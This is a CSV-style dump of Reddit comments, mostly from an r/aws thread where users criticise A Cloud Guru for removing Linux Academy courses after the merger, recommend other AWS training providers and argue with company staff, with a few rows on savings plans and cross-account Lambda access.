g6009dv,ivz7mn,[https://aws.amazon.com/fargate/](https://aws.amazon.com/fargate/),1.0
g5v32sw,ivz7mn,Dedicated hosts and savings plan are used for very purposes. Dedicated hosts are not meant to save money. You pay extra to get your own private hardware that's not shared with anyone else.,1.0
g5v5xeh,ivz7mn,Got it. Thank you! I don’t really care about sharing the physical server with anyone else. What’s most important to me is to be able to have the server up 24/7 (so I don’t deal with spin up time when app needs to compute right away) and the most cost efficient way to do that. It sounds like the savings plan would achieve that?,1.0
g5v66lt,ivz7mn,"Savings plan or reserved instance, yeah. Also make sure you use the cheapest region if cost savings is your goal. And maybe consider the new Graviton based instances.",1.0
g5ub9n0,ivxoon,"Between AWS accounts? Yes, you can allow a role to use your lambda and then allow them to use your role",5.0
g5utqfb,ivxoon,"It's exactly what roles are for. You ask what their account id is and create a role that has a trust policy allowing their account to assume your role. You can give the role any permissions they need.

A better solution would be to limit it to a specific user or role in the other account. And require an external ID.

https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-user_externalid.html

Get them to do an aws sts get-caller-identity

And then use that to inform you what to use for principal in the trust policy.",2.0
g5wi5u3,ivxoon,We can expose the lambda function using API gatway,2.0
g5wpco4,ivxoon,This is the best idea. You can either use an API Key or use AWS_IAM permission to access the API.,2.0
g5zcutf,ivxoon,"think about when you need to change, test new version, evolution and operations aspects.  api gateway or another layer in between may be a good choice.  if’s it all internal and dev cycles are aligned,etc., may not be necessary.",1.0
g5uopc3,ivxoon,"&gt; upload their code into my lambda function

let them publish code as private NPM package and include it in your Lambda.
Or even easier, they allow access to their github and you pull latest version and include in your lambda.",0.0
g5ud3i2,ivwj2w,"Confirming here.  We were LA subscribers and when getting ready to sign for ACG, they told us all content would be made available by a specific date but would not provide in writing when requested.  We went with CloudAcademy. (Edit CA= CloudAcademy)",73.0
g5uex29,ivwj2w,What is CA ?,9.0
g5ufdqv,ivwj2w,Cloud Academy,11.0
g64mfh9,ivwj2w,I had to make the same decision for my org and went with CA (QA Beyond it's called now).  Cloud Academy is pretty good and got acquired by QA so lots of other content got added to their platform.  They have hands-on labs and challenges which test your problem solving and you can tailor learning paths to fit your team with a really good progress/nudge system to stay on top of training deadlines. CA builds up a skills profile and leader board across the org and works pretty flawlessly on mobile too which (as much as I love LA) was not the case for Linux Academy.  ACG seems nice (I've got a personal sub) but they couldn't commit to the assurances like if they were going to retain LA content - long term plans which you need to be sure of when making a key decision like a cloud training platform for enterprise (well kinda). QA did things the right way and you basically get CA old content + they added all the QA content to their library which they are constantly updating.  They also have a pretty sweet training roadmap so you can see what's lined up.  Not a CA employee btw - just a happy customer!  The quality is good so far ;-),0.0
g5xpnc0,ivwj2w,That state perpetually on fire,11.0
g5w7xv9,ivwj2w,Certificate Authority,23.0
g5v4dvb,ivwj2w,Chartered Accountant,21.0
g5ufb7h,ivwj2w,Codeacademy,5.0
g5uh5m3,ivwj2w,[deleted],-6.0
g5xzowy,ivwj2w,MY MAN. \*fist bump\*,1.0
g5uqvki,ivwj2w,"Thanks, I’ll check this out.",3.0
g5uaecc,ivwj2w,That website has fallen so low that I can’t even,94.0
g5y05nn,ivwj2w,That's odd,6.0
g5ukn8x,ivwj2w,"Wow, I will be promptly cancelling my subscription if that is the case. Adrian’s course was invaluable in obtaining my pro certification. The ACG equivalent, like you say, was garbage. 

LA courses have always been superior in my experience.

Update: yes, it appears the LA course has been deprecated. What a real bad move by ACG - in that case I would recommend using Adrian’s material directly @ https://learn.cantrill.io",92.0
g67t4vo,ivwj2w,"wow thanks. Actually created a LA account, and 2 weeks forward after vacation, realized it's ONLY ACG. Impossible to launch LA....",3.0
g885vo5,ivwj2w,"Hi! We wanted to give you an update on the deprecation of LA courses: *Based on feedback from the Linux Academy community, starting October 2nd, we extended access to many legacy LA courses through the end of the year. These courses, which will be labeled ""legacy"" in the title, will show up in search and navigation as usual.* 

More info on how we're creating content going forward and how we'll be handling future course deprecations: [https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content](https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content)",1.0
g5ulbzr,ivwj2w,"Hated them ever since it became obvious that they used throwaway accounts and then ""official"" accounts to spam their content on different subreddits. I mistakenly signed up for it once and they charged me $90 months later. 

Gross business practices and I refuse to support anyone who works for/with them.",25.0
g5ue0ep,ivwj2w,"I feel like their labs for AWS are good. But some of their video content is disgusting. They had a kubernetes “course” that was just some Australian dude saying “kubernetes is cloud agnostic- that means kubernetes is kubernetes” a dozen times. It was only like 90 min long. I’ve seen other things in their DevOps courses. Where they just give a basic explanation of a CI/CD pipeline. Not walking you thru setting one up. Even their kubernetes lab in another course was not even in kubernetes environment. 

In my experience, there are better alternatives. KodeKloud is great for K8s and has exceptional labs, Whizlabs has the best practice exams. ACG is great for maybe getting into cloud but I would find a course on Udemy from them for fraction of price",20.0
g5v3qef,ivwj2w,Well CKA course from Linux Academy was useless too TBH. But I agree to your sentiment.,3.0
g5vhove,ivwj2w,"Sorry for confusion. Was referring to ACG. I’ve dabbled with LinuxAcademy before merger and it was pretty good but haven’t used it enough to give an accurate review. 

All in all, KodeKloud is the best IT educational I’ve ever seen. Their K8s courses are legendary and even their courses on DevOps prerequisites are fantastic for newbies. Recommended the devops prereq course to some juniors at my job and their quality of work sky rocketed upon completion. Mumshad did a fantastic job all around.",1.0
g5vjak9,ivwj2w,Nigel's K8S videos are pretty good.,3.0
g5wb40m,ivwj2w,"Yeah Nigel Poulton is great, real shame his content's on ACG.",4.0
g63zu4a,ivwj2w,"&gt;They had a kubernetes “course” that was just some Australian dude saying “kubernetes is cloud agnostic- that means kubernetes is kubernetes” a dozen times.

You know what else is cloud agnostic **and** webscale? MongoDB!

[**https://youtu.be/b2F-DItXtZs**](https://youtu.be/b2F-DItXtZs)",3.0
g643dmt,ivwj2w,This is great,1.0
g5uo55u,ivwj2w,"Guess I won’t be renewing this year... that’s a bummer, I really liked LA courses.",21.0
g8860ek,ivwj2w,"Hello! We wanted to give you an update on the deprecation of LA courses: *Based on feedback from the Linux Academy community, starting October 2nd, we extended access to many legacy LA courses through the end of the year. These courses, which will be labeled ""legacy"" in the title, will show up in search and navigation as usual.* 

If you need more info on how we're creating content going forward and how we'll be handling future course deprecations, here's a write up for our VP of Content: [https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content](https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content)",1.0
g5uqznc,ivwj2w,Is there a sensible way to collectively escalate this for LA subscribers?,17.0
g5vo210,ivwj2w,"Adrian's classes are always top notch.  He has a separate company now.  I have free access to the major sites through work and still spent money personally on his new courses.  

https://cantrill.io/",16.0
g5ubkvn,ivwj2w,Can someone recommend alternatives to this site?,36.0
g5udsxp,ivwj2w,"Don’t know if there is any other alternative in terms of a similar website. But independent trainers like Stephene Maarek, Adrian Cantrill offer AWS training. 

I will most likely be getting their courses for my AWS Pro level cert now the ACG has removed Linuxacademy content.",22.0
g5wop0n,ivwj2w,If you could only sign up for one of those trainers (limited on money) who would you recommend?,3.0
g5xfnjm,ivwj2w,"Stephane Maarek's stuff is super high rated and is usually on sale at Udemy for like 90% off. I'm using his course for the DevOps pro test and it's very comprehensive and he uses a hands-on approach which is great.

Adrian's stuff is also great, but his courses are a bit pricier.",5.0
g5xj9be,ivwj2w,"You can get Stephane Maarek course for like $15 during monthly Udemy specials. Adrian Cantrill AWS Pro course is $80. Maarek course simplifies all topics. Adrians course has hands-on labs and feedback says  it is more in-depth. Adrian’s Pro course isn’t finished yet. He is still working on it.

I think both courses complement each other. I believe you might need both courses to pass AWS Architect Pro.",2.0
g5xyisk,ivwj2w,"I got my AWS certs from Adrian's courses, Tutorials Dojo exams and about of a year of hands on AWS experience.

I prefer material that actually teaches you the subject matter and not just rattling off words you need to memorize to pass the exams, so I find Adrian's courses are good on that.

As for free material, AWS hosts certification quiz shows on their Twitch channel from time to time.",1.0
g5uk1dr,ivwj2w,"I like pluralsight.  

LinkedIn Learning is good if you're not trying to learn anything",67.0
g5wptia,ivwj2w,Pluralsight is worse than ACG for AWS certifications.,10.0
g5uupe5,ivwj2w,Savage! Kind of agree though...,7.0
g5v360d,ivwj2w,"Do you mean you didn't want to learn 5 hrs content on ""elevator communication strategies""",10.0
g5xy19d,ivwj2w,I'm looking for the Brigette Hyacinth course in how to shove your blog in every LinkedIn user's feed.,5.0
g5wjs6o,ivwj2w,LOL,1.0
g5vdatv,ivwj2w,[https://learn.cantrill.io/](https://learn.cantrill.io/),12.0
g5ucex1,ivwj2w,CloudAcademy looks solid. PluralSight more towards development. Some things on Linux foundation could be useful.,5.0
g5uut55,ivwj2w,It can be hit and miss but there's some gems on udemy,2.0
g5yjw63,ivwj2w,"digitalcloud.training for associate level stuff and below (I suspect pro stuff might be coming).

Neal's content is very thorough. I think his content will eventually be the market leader for AWS cert training; his business is fairly new though so still trying to make a name. 

I rate it higher than the Stephene Maarek content that other people are recommending.",2.0
g60sunj,ivwj2w,"Yes, Neal Davis doesn’t get enough love. I tried his Developer Associate course just to see his teaching style and it was very in-depth and comprehensive.",1.0
g5ub134,ivwj2w,"The catalog honestly feels like a bunch of spam courses now, save for some that actually sound good. I didn't like their Udemy courses 2 years ago and they ultimately lead me to LA. I'm kinda disappointed.

Edit: Also can we make the list of instructors to follow/support even bigger?",13.0
g5uipp9,ivwj2w,Why don't they just... leave all the content up? I'm confused. It would cost them nothing to leave it.,37.0
g5vq1t3,ivwj2w,"If it is inferior content, then it would be easy to judge the old (better) content right next to the new (inferior?) content.  That looks bad to customers.

Imagine Kelloggs bought General Mills and going to the grocery store and seeing the two brand's boxes of corn flakes sitting next to one another.  The Kelloggs is 33% smaller than the General Mills, but they have the same price.  Would you continue to buy Kelloggs corn flakes after the older General Mills products leave the shelves?  Now imagine the only corn flakes you ever saw were the small Kelloggs.  You would just think thats what cork flakes cost, and pay it.",13.0
g5w7hlk,ivwj2w,"But this analogy doesn't make sense for ACG because subscribers are already paying a fixed price to access their courses.

Customers are have already paid for both Kelloggs and General Mills. Why not just leave General Mills as well in case some customers prefer it?",3.0
g5x1wm6,ivwj2w,"&gt;But this analogy doesn't make sense for ACG because subscribers are already paying a fixed price to access their courses.

This change is not about current subscribers.  Its about future ones.  A subscriber that just joined today (or any time after today) would only see Kelloggs and only have the expectation for that level of content, not the richer experience they are doing away with.",9.0
g5x4h7c,ivwj2w,"Understood, thanks for clarifying.

This upsets me even more now.",3.0
g5uyr8j,ivwj2w,"I think I get the intent of your statement, but technically it would cost them quite a bit more in storage and transfer costs. Double the courses, and quadruple the content.

That being said, in the long run it will cost them more as people leave the platform.",3.0
g5yc1ay,ivwj2w,Is it possible they are having to pay the original content creators per sub or view still? Would make the most sense if they are removing valuable content that they got from the acquisition.,2.0
g8865cn,ivwj2w,"Here's an update on the deprecation of LA courses: *Based on feedback from the Linux Academy community, starting October 2nd, we extended access to many legacy LA courses through the end of the year. These courses, which will be labeled ""legacy"" in the title, will show up in search and navigation as usual.* 

More info on how we're creating content going forward and how we'll be handling future course deprecations: [https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content](https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content)",1.0
g5uvfgm,ivwj2w,Can confirm. This is reason to cancel.,20.0
g5uym0w,ivwj2w,Thanks for confirming. Some people were unsure if what I was saying was true. Appreciate it. 👍,5.0
g5vhvla,ivwj2w," *Rather support people like Stephen Maarek, Adrian Cantrill, Eissa Sharif, Neal Davis etc.*

\+1 to that.",16.0
g5zfpvm,ivwj2w,"My free video AWS Certifications courses could always use the support. Honestly hard to get noticed, anything I post suffers from downvote manipulation in /r/AWSCertifictions

When I posted my free SysOps Admin course I watch it go from one to zero over a period of 48 hours with about 40 upvotes and 40 downvotes.  


[https://www.reddit.com/r/AWSCertifications/comments/ikpzx5/free\_14\_hour\_aws\_sysops\_administrator\_associate/](https://www.reddit.com/r/AWSCertifications/comments/ikpzx5/free_14_hour_aws_sysops_administrator_associate/)",4.0
g62o3b3,ivwj2w,Thanks :),1.0
g5xzzi2,ivwj2w,Stephen Maarek and his PowerPoint presentations?? You must be kidding mate,-5.0
g5zs8m5,ivwj2w,"I have two certs using mostly Stephane's courses for prep. I picked them up for like $12 on Udemy. Sure, I skimmed some whitepapers and did some labs on my own but those videos are fantastic. Your dislike for powerpoint doesn't change that. Stephane covers everything that is on the test in just enough detail to keep the videos interesting and tells you where to read more to supplement your knowledge on some of the ""rabbit hole"" topics  (e.g. storage, autoscaling, cost optimization)..

I didn't just barely pass either. I almost aced both of my exams and I am a terrible test taker.",2.0
g5yrz26,ivwj2w,"He really knows his stuff and for the money, it's by far the best bang for the buck.",1.0
g5zsrt6,ivwj2w,"Downvote me as much as you can, this won’t give extra aws knowledge. At least I know what kind of people are in this sub",0.0
g5zu3k2,ivwj2w,"Actually, I did learn a lot from Stephane's courses. They were a great START for me.",1.0
g60nmmu,ivwj2w,"I was mainly talking about his aws solution pro exam, which is complete rubbish not enough for practitioner exam. I gave him a proper 1 star rating which is more what that course is worth.",1.0
g5yv1cj,ivwj2w,"I tell you a secret, there are aws white papers, you can get more information than from Stephen Marek, and the best part? They are free.",-2.0
g5zdxoi,ivwj2w,"Stephane's courses focus on individual certifications. If you want to focus on getting through the certification and don't have extensive experience, your best bet is getting a Stephane's course",1.0
g5ua3z8,ivwj2w,subscribing to hear other takes,19.0
g5wg5xh,ivwj2w,"Hey Everyone!

First, as you can see from my username and post history, I am Terry, and I used to be with Linux Academy (and now with A Cloud Guru). I was a content creator for a number of years, then I led the LA content team and now I lead the combined company content organization at ACG.

I will try to address a few key points from this post and the remainder of the thread and explain a bit how things will work at ACG going forward in terms of the kind of content you can expect from the combined organization (plenty of people in content from both LA and ACG have come together in this new team).

Here we go:

* As far as the DevOps Pro course, there was no intended inflated course runtime. We did have a problem where the quizzes were all marked at their maximum run length which did inflate the runtime. This was reported on Friday and corrected immediately. If you check the course now (linked here - [https://acloud.guru/learn/aws-certified-devops-engineer-professional](https://acloud.guru/learn/aws-certified-devops-engineer-professional)), you will see that it reports a much lower value just over 10 hours in length
* The combined catalog of courses at ACG now (which is replicated on LA) is over 300 courses in length. A substantial portion of that catalog came from the LA platform (in fact, more than 200 courses were migrated from LA to ACG, many replaced ACG courses on the platform for similar reasons we will get into in a moment). So, a good number of the LA courses exist on ACG as is.
* There were ACG courses that were migrated to the LA platform and, in some cases, they replaced LA content. The reasons that a course from EITHER platform would replace the other would be related to currency, ratings, branding, engagement, popularity, or notoriety. in most cases, it would have come down to currency and ratings (we want everyone to have the most up to date content we have available).

The good news is, we have been working hard to combine the best of both organizations so that you can decide what material you can consume to meet your goals. ACG was known for creating shorter courses that were targeted directly at teaching you what you need to know to pass the certification exam. LA content was known to be longer form, hands-on content that would also provide context for real-world application of that knowledge.

Going forward, you will have access to either or both. Certification courses now are being built as you would expect (only they will now also have the Hands-On labs and cloud playground/sandboxes for practice), but there is also the deeper dive material to support those certification courses. Now, we have some work to do in order to make clear which deep-dive courses support which certifications (which follow the major domains in an exam), but that is all underway, we just are not 100% there with everything we would like to have done and we need to be more deliberate in clarifying how that will look on the platform.

The point is that regardless of which platform you came from or which you preferred, you will see the best from both present in our content going forward.  If you JUST want to pass a certification, just take the certification course. If you need a deeper dive in a particular section within a certification course, the deep-dive will allow you to explore that topic (Hands-On).

Not everyone wants to take a 42 hour course, not everyone can prepare for a complex certification in 10 hours. Regardless of which side of that fence you find yourself on, you will find what you need, and most importantly, you are in charge of the learning journey that you find the most useful to you.

One final note, although we may remove/deprecate a course (on both platforms) for any number of reasons, that does NOT mean it is gone. If you have the direct link to that course still (bookmark!), you can still reach the material and complete the course you may have started. If you find you have lost access to something we otherwise retired, you can contact [support@linuxacademy.com](mailto:support@linuxacademy.com)  and we can provide the direct link so you can complete your course. We are working on a better way to deprecate and link to new/old material to provide a better transition going forward. We realize some of this has not been completely smooth for everyone and we hope you will be patient with us just a bit longer now that the migrations are complete so we can turn our attention to some platform clean up and provide better clarity about where everything is.

We appreciate each of our students, and collectively, we have always wanted what is best for you all. The combination of our two content organizations will allow us to provide that ""best of both worlds"" experience going forward.",51.0
g5ww7h5,ivwj2w,"It would be very cool to leave old content accessible for new users and to have a dedicated section with links to it in the platform, i think that it would be best to let the users decide for themselves, Sure present the chosen choices at the top level, but at least catalog / organise the deprecated content",15.0
g5y1wkw,ivwj2w,"This 100%, I had planned to take several of Adrian’s courses (as an example), however that is no longer a option. 

I love LA’s content and have always preferred it over ACG - it’s contains far more detail.",5.0
g5zbyz9,ivwj2w,"I just took my asa, and I was mad I couldn't access LA courses. The acg courses had so many areas that were glazed over and not explained well.",1.0
g5x5h53,ivwj2w,"What happened to Adrian Cantrill's AWS Security Specialty Course?

It was on Linuxacademy and now it's not on ACG. I can't find it on his personal website either.",12.0
g5x9qp4,ivwj2w,"Terry thanks for replying! But your post doesn't really address any of my concerns.

* The AWS Devops course I am referring is the one on Linuxacademy platform created by Anthony James not the one on ACG by Nick. You can clearly see the course is listed as 27 hours long. And all the 6 quizzes are marked as 4 hours in length. 6 X 4 = 24 hours. That means the course is 3 to 4 hours in length. Check for yourself!  Link: [AWS Devops Pro Course.](https://linuxacademy.com/cp/modules/view/id/633)
* Same is true for AWS Architect Pro course. Advertised as 44 hours long. But in reality its only 14 hours long inferior ACG content by Scott Pletcher.  Link: [AWS Arhictect Pro Course](https://linuxacademy.com/cp/modules/view/id/788).  Seven quizzes marked as 4 hours long each to increase course total duration. **Multiple courses have inflated course lengths. Since you are the content creator for Linux Academy and ACG, I am sure you already know this.**
* Your point about catalog of courses is irrelevant. We don't want ACG inferior content. We want what we paid for. And you are not giving that to us. You could easily still give access to the old (better) content and mark it as LEGACY as you have done for other courses. We shouldn't have to start the course before hand nor should we have to open support tickets for content links. **Also your ACG rep told us that Labs may not work with deprecated content. So again, I am not getting what I paid for. Labs were a major part why I signed the yearly subscription.**
* When ACG told us that they were merging with LA they assured us that we will still have  access to LA content and even ACG content. That is clearly not the case. I have more than 7 months left on my Subscription. If I had known you were going to replace all Linuxacademy content with inferior ACG content, I would have never signed the yearly subscription. You, ACG, lied to us. Scamming people during a pandemic, you're better than this.
* You said that you replaced the LA courses because ""currency, ratings, branding, engagement, popularity, or notoriety."" It's telling that you didn't mention better quality or content as the reason for replacing LA courses without any notice. Of course a 3 hour course will be more popular, watched, than a 32 hour in-depth one. Doesn't mean it's better quality.
* **The least you could do was be upfront. Even may be give a 6 month warning to all loyal LinuxAcademy subscribers that you will be replacing the content with ACG crap. We also want functioning labs (deprecated courses), which we were promised in our subscription.** As other posters have stated some content was completely removed, not just replaced. Or you could just give us the LA content in a separate menu with functioning labs. Heck you could even give us an option to download the old (better) courses. Since you think they are deprecated. They have no value to you now, right?

The rest of your post is just ACG marketing PR stuff that doesn't mean anything. I know you work for them now, so you have to say it. But Linuxacademy sold out to the highest bidder and loyal fans of LA were screwed in the process.",35.0
g5zkyer,ivwj2w,Couldn’t have put this better myself.,5.0
g6g1vdv,ivwj2w,"They didn't replace all LA content with inferior ACG content. Saying that is just flat out dishonest. I get it, you're pissed but at least be honest about the reality of the situation.",2.0
g5wrnj3,ivwj2w,"I was *not* able to get to LAs security certification videos. Just the notes and flash cards. I realize it was deprecated, but it would still have been useful. 

Every certification I have taken (6), I have used both ACG and LA.",6.0
g5ybb2t,ivwj2w,"The links for accessing the old content differs from what Adam Vincent is telling us in the LA slack. 

&gt;The course content is outdated, and has been removed. I can tell you, with absolute certainty, that the course will not be coming back. No exceptions can or will be made.  
&gt;  
&gt;It does do harm to have old, outdated material on the site because it is no longer accurate, and causes a lot of confusion. Studying that material will give you wrong information when preparing for the current Solutions Architect exam, and current Solutions Architect roles.  
&gt;  
&gt;There are a lot of fantastic Deep Dive courses in our combined catalog that go just as deep or deeper than the C01 course did. If there is a specific topic that you want more info on, just run a search for it in the search bar. Our Training Architects spend time naming and tagging our content to make it really easy to find exactly what you want to learn.",3.0
g60uo60,ivwj2w,"So Acloudguru is saying one thing in private and another contradictory thing in public? Also look at the tone of Adam Vincent in that post.

And how can an older (better) course harm me? As a professional let me be the judge of what is beneficial for me. Also they do have older courses on the site marked as LEGACY from Linuxacademy days still, so Adam is straight up lying. See how slimy and two faced ACG and LA are now.",3.0
g6g2uys,ivwj2w,"Hi, Adam here.

  
I was not intentionally lying. The info I posted in the LA Slack was the information I had, and I was trying to be helpful in spreading what I knew regarding the changes to our platform. I'm one of the Training Architects, so my job is literally to spread info. The situation has clearly changed, so I will no longer be repeating the now-outdated information.",3.0
g6h9b2h,ivwj2w,"Is that the outdated information, though? Because now we’re getting two different people telling us two different things.",2.0
g6jfek5,ivwj2w,"u/TerryLinuxAcademy is head of content. He knows more than I do. 

For context, my post from the community Slack quoted above is about a month old (shortly after we announced the combined platform), so I'd trust current info from Terry more than old info from me.",2.0
g6mt7cw,ivwj2w,"Adam, I appreciate that you came in here to clear up what you said earlier in the slack channel.

I have no issue with you personally, I know you are just an employee and doing your best to toe the company line.

However, I do have a issue with ACG team and the head content creators for basically lying to the LA subscribers.",5.0
g6pfvze,ivwj2w,There’s no basically.  They lied and continue to lie.  If you confront them on it they will stop talking.,3.0
g6pftyl,ivwj2w,"How about you give links to all the courses and let people decide what they want to watch with the money they paid?

Stop lying.  Be an honest person for once in your life and give us all a spreadsheet with links to every video you have.  Do not make people email support for one link to one video.  Do the right thing.

Note that Terry has no answers to his lies and has stopped posting for almost a week now.  How long till you run away with all your lies?",2.0
g6g3bmg,ivwj2w,"How can something older harm you? Exams and technology completely change. In fact things are changing faster then ever. Something considered outdated that was true a year or two ago could be completely incorrect now, because the industry has changed.",1.0
g5zk6i0,ivwj2w,"AWS hardly ever deprecates anything. Old courses are not “inaccurate” technically. The UI might have changed, but the fundamentals don’t. If for instance the Developer training says that Lambda only supports Java, C#, Python, and JS. The newer training may say that Go and C++ were added, but none of the other languages were dropped. I would go in knowing that a course labeled as “deprecated” may not be up to date, but I would still get another perspective.",4.0
g65ucn0,ivwj2w,Exactly. CBT Nugget has a special section for outdated content. One can watch any historical content if required. Not sure what is the problem. Perhaps it is royalty rather the technical issue.,3.0
g5ywomy,ivwj2w,"Thanks. 

I was going to write about that too. I can still see the LA SA Pro course, although I have always liked acloudguru content, so happy to see the new course too, and I am using that going forward. Plus some of the old course was, well, old.

Looking forward to full access to all the acloudguru stuff too.

I think it is fair to say that ACG is better for exams, but the breadth and detail in LA was awesome. So hopefully we get the best of both.",3.0
g7pxhep,ivwj2w,"Thanks for the reply. Op is straight up a whiny a-hole just started complaining and stated the problem in the most unprofessional manner. 

Op, are you sure you deserve the ""professional"" stamp after posts like these?",1.0
g5wler7,ivwj2w,"Awesome answer. Thanks for providing this explanation. 

As a customer of both LA and ACG I've been cautiously optimistic about how this merger was going to shake out after a year or two.",-2.0
g5v3jeo,ivwj2w,"honestly, most of those tech/finance/vc  guru/infuencers/youtubers are all scumbags looking to swindle people out of their money.

I don't both with them or whatever crap they're trying to push",7.0
g5y2u19,ivwj2w,"Ryan has taken something that was really good and helpful to the community (not just LA, but ACG in the original form too) and tried to turn it into a money making machine. It's lost sight of its original purpose. Adrian took down his LinkedIn post when he quit ACG, but I remember it was really quite damning. There's lots of marketing plots, and things that are outright illegal - for example buying the SA Pro course back in the day and being promised lifetime access, of course what I didnt appreciate is that they'd deprecate the course and launch new ones which were subscription only. Same for the perpetual sales that things used to be on.

&amp;#x200B;

I personaly thought Adrian was the pinnacle of ACG.",5.0
g5uox12,ivwj2w,"I got my AWS SA associate few months ago. I had a lot of gaps in knowledge, so I started with LA and really enjoyed their course - it was more of a ""Lets explain everything so that you're more than well rounded"". Perfect for me.

I had access to ACG through work, so I figured I'd take their test for extra practice. I couldn't pass it multiple times. So I ended up using a handful of ACG videos to ""brush up"" on the areas I sucked at. They were more focused on what you needed to know to pass, very short.

ACG tests were way more helpful in preparing me for the real deal. Still, I've done most of my learning on LA and I really love their teachers and I think the videos themselves are WAY better recorded and more focused on teaching. I love their content.

ACG has a nicer web player though. I'm happy I have access to both and I felt that LA overall has more useful content. I hope through feedback that we get a best of both worlds.",13.0
g5ugaai,ivwj2w,I with you on this,5.0
g5uveil,ivwj2w,"I originally signed up for ACG to do the associate courses - it went great and I was really impressed.

I then moved on to try the DevOps Pro certification, and found the content massively lacking - they seemed to just omit important content and tell you to read the documentation and the white papers. That’s what I’m paying you guys for, so I don’t have to read the white papers!  Needless to say I failed the official practice exam miserably.

I cancelled my subscription and moved to Linux Academy and was really impressed - there was a 32 hour course and all of it was important, relevant information that needed to be there - I smashed the practice exam and then passed my certification with a score of 900.

I started doing the LA Solutions Architect course and it has now been deprecated - replaced with Scott Pelter’s course which, again, plays the handy get out of jail free card of saying that you need to read the documentation and the white papers to fill in the missing information.

This merger really doesn’t bode well - I was hoping they would recognise that the LA content was far superior to the limited ACG content, but it seems we are being shafted. I won’t be renewing.",4.0
g5zn5ua,ivwj2w,"This was exactly my experience and
The reason I joined LA - I don’t want to read 30 effing white papers!",2.0
g886iid,ivwj2w,"Just wanted to throw out an update on the deprecation of LA courses: *Based on feedback from the Linux Academy community, starting October 2nd, we extended access to many legacy LA courses through the end of the year. These courses, which will be labeled ""legacy"" in the title, will show up in search and navigation as usual.* 

More info on how we're creating content going forward and how we'll be handling future course deprecations: [https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content](https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content)",1.0
g5uzvvb,ivwj2w,"Oh, that bites!  I've got a yearly subscription to LinuxAcademy, and I was slowly working my way through Adrian Cantrill's Solutions Architect Associate course.  I notice now that it's ""Deprecated Aug 2020"". He does a great job, and his accent is easy to understand (easy enough that I usually watch his videos on 1.25x speed).  After I finished the SA Associate I was going to start on the SA Pro.

Edit: I see that Adrian's got his own site now offering Associate and Professional (although the Pro isn't *quite* ready yet).  I may have to buy his Pro course once I'm done with LinuxAcademy's Associate.",4.0
g5v7e9x,ivwj2w,"I’ve used both in the past. For me LA was superior for the pro level SA cert, but I thought ACG was great for everything else.

I still have access to the SA pro course on LA, it’s just marked as deprecated.",5.0
g5vm169,ivwj2w,"Agree, ACloudGuru has really dipped in quality in the last few years imo",3.0
g5wbju8,ivwj2w,"I just checked my LA account and found the course still here for me, it's now ""deprecated"" though which is a shame. Adrian's new content on https://learn.cantrill.io/ is even better now.

https://linuxacademy.com/cp/modules/view/id/245",4.0
g5zvje5,ivwj2w,"I'm pretty pissed about it. I loved LinuxAcademy and found it much better than ACG. I heard they were taking over and I was like ""well, if they keep the LA courses, who cares?"". Then, boom, the LA content was gone.",3.0
g5vkap5,ivwj2w,"Oh well, I'm not renewing my Linux Academy subscription. ACG just lost my business. I'll not be recommending LA or ACG again.",5.0
g5zbvs1,ivwj2w,I‘ve also stopped recommending them.,3.0
g5ufud9,ivwj2w,"Heard something similar with a colleague who was doing the security training on LA. I already had access to ACG but I heard that LA was actually superior.

I'm at 30% of the AWS developer associate, so let's see how it goes.",3.0
g5uxdxg,ivwj2w,"I just checked and they had ""deprecated"" AWS SA courses and the new one, marked as 68 hours, are actually 20 hours with 12 (TWELVE!) 4-hour quizzes throughout the course!

are you shitting me?

Cancelled my recurring subscription and told them in the reason that until the content is restored, I will be leaving the platform.",3.0
g5w90bl,ivwj2w,"I used both ACG and LinuxAcademy to pass my AWS security specialty cert. For that specific course, I agree that LA was superior content -- but ACG's practice test was a better way to prep.

I was very excited when they merged, but after a few months, I cancelled my ACG subscription because LA was more value (even though I had the cheaper $29/mo pricing) -- and it was clear any 'merging' of content was going to take a long time. I suspect it has to do with content licensing etc.

I'll still keep my LA subscription, I still find it better than most other platforms, and I just enjoy a platform where it's a buffet of content. I had to quickly learn Aurora some months back, and LA had good content to help me do that. Without a platform, you'd have to spend maybe 1-2 hours searching for the content, instead of just consuming vetted high quality content from the get-go.

But if the content starts reducing in quality, nobody is going to pay that anymore.",3.0
g5wyjrk,ivwj2w,"Fuck acg.. knew this would happen. Also Linux academy stopped producing content, providing updates after the purchase. So damn sad about it really.",3.0
g886s7x,ivwj2w,"Hi! We wanted to give you an update on the deprecation of LA courses: *Based on feedback from the Linux Academy community, starting October 2nd, we extended access to many legacy LA courses through the end of the year. These courses, which will be labeled ""legacy"" in the title, will show up in search and navigation as usual.* 

Also, new content created will be added to both platforms, so LA learners are still getting updated and new content! 

More info on how we're creating content going forward and how we'll be handling future course deprecations: [https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content](https://acloudguru.com/blog/news/an-update-on-how-were-creating-new-acg-content)",1.0
g5uiwcu,ivwj2w,Totally agree with you cloud guru is such a scam. They can easily fix the issue and provide all LA users access to their platform but they are coming up with excuses that the migration has delayed and still we have to pay hefty amount to LA for renewal of subscription. I am thinking to cancel mine overall in Dec2020. Such an nonsense,6.0
g5vnmt4,ivwj2w,"Can confirm. I was using LA to prepare for the AWS-CSA. They deprected the LA course for that and replaced it with an ACG one that was about half as long, and not nearly as thorough. I won't be renewing.  


[https://www.reddit.com/r/AWSCertifications/comments/ijfhe3/new\_linux\_academy\_awssaa\_course\_is\_much\_shorter/](https://www.reddit.com/r/AWSCertifications/comments/ijfhe3/new_linux_academy_awssaa_course_is_much_shorter/)",4.0
g5uswyh,ivwj2w,"Question - why do you like Adrian Cantrill more than ACG? 

For example, MANY users here in r/AWS recommend ACG as the top learning material for AWS related material.. this is very puzzling to me why there's a brigade of haters rolling in. 

Can someone chime in on the difference in learning material? Do you find Adrian to be more extensive? Comprehensive?",7.0
g5uxpt2,ivwj2w,"For the AWS Big Data cert, I studied from both ACG and LA. I must say the LA content was far better than ACG. 

ACG is usually someone reading a lot of slides, whereas LA was usually navigating through someone's notes and focusing on labs.

